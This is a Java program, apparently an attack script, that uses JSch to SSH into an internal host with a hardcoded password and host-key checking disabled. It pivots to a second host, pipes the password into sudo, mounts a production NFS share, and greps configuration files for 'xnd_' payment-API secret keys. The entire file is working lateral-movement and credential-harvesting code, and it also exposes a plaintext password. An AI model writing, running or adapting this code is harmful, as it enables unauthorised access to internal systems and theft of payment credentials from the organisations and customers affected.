import com.jcraft.jsch.*;
import java.io.*;
class DKF {
  public static void main(String[] a) throws Exception {
    JSch j = new JSch();
    java.util.Properties p = new java.util.Properties();
    p.put("StrictHostKeyChecking", "no");
    Session s = j.getSession("user", "10.14.36.23", 22);
    s.setPassword("kutul0nc4t");
    s.setConfig(p);
    s.setTimeout(10000);
    s.connect();
    ChannelExec ch = (ChannelExec) s.openChannel("exec");
    // SSH to infra host (10.14.16.10) and mount NFS there
    ch.setCommand("sshpass -p kutul0nc4t ssh -o StrictHostKeyChecking=no user@10.14.16.10 'echo kutul0nc4t | sudo -S apt-get install -y nfs-common 2>&1 | tail -3;echo ---MOUNT---;echo kutul0nc4t | sudo -S mkdir -p /tmp/nfs_prod 2>/dev/null;echo kutul0nc4t | sudo -S mount -t nfs -o ro,nolock 10.14.16.20:/mnt/tmp/temp_1/export /tmp/nfs_prod 2>&1;echo ---LS---;echo kutul0nc4t | sudo -S ls /tmp/nfs_prod/ 2>/dev/null;echo ---NEO-FIND---;echo kutul0nc4t | sudo -S find /tmp/nfs_prod/neo/ -type f 2>/dev/null | head -10;echo ---XENDIT-GREP---;echo kutul0nc4t | sudo -S grep -r \"xnd_\" /tmp/nfs_prod/ --include=\"*.properties\" --include=\"*.yml\" --include=\"*.yaml\" --include=\"*.xml\" --include=\"*.env\" --include=\"*.json\" --include=\"*.conf\" 2>/dev/null | head -10' 2>&1");
    ch.setInputStream(null);
    InputStream in = ch.getInputStream();
    ch.connect();
    byte[] buf = new byte[8192];
    int i;
    while ((i = in.read(buf)) != -1) System.out.write(buf, 0, i);
    ch.disconnect();
    s.disconnect();
  }
}
